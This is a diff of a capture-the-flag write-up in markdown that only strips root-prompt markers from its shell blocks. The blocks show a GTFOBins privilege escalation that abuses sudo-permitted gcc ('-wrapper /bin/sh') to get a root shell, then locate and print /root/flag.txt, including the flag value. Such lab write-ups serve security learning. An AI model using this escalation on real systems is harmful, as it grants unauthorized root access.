@@ -217,9 +217,8 @@ Run that GTFOBin again with our account
 
 ```bash
 Pentester@host:~$ sudo gcc -wrapper /bin/sh,-s .
-# whoami
+whoami
 root
-# 
 ```
 
 Privilege escalated.
@@ -231,14 +230,14 @@ Privilege escalated.
 Now the flag's gotta be here somewhere, normally I use `find` (looking for flag.txt) or `grep` (looking for string FLAG within a file) on the entire file system. Trying find first 
 
 ```bash
-# find / -name flag.txt -type f
+find / -name flag.txt -type f
 /root/flag.txt
 ```
 
 Then
 
 ```bash
-# cat /root/flag.txt
+cat /root/flag.txt
 FLAG{7H15_SUDO_C00K3D_R007}
 ```
 
